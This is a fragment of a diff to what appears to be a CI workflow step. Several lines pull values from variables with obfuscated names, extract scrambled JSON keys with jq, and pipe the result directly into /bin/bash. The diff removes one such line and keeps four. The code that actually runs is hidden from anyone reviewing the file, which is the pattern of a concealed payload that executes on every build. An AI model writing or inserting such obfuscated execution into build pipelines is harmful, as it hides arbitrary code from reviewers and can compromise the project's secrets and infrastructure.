@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$evod0301" | jq -r .k7 | /bin/bash
           printf '%s' "$vfty67679" | jq -r .cpe717 | /bin/bash
-          echo $rdm30 | jq -r .ht81270 | /bin/bash
           echo $aqv91603 | jq -r .vdrlj0563 | /bin/bash
           echo $a0632 | jq -r .dnqcj87 | /bin/bash
 
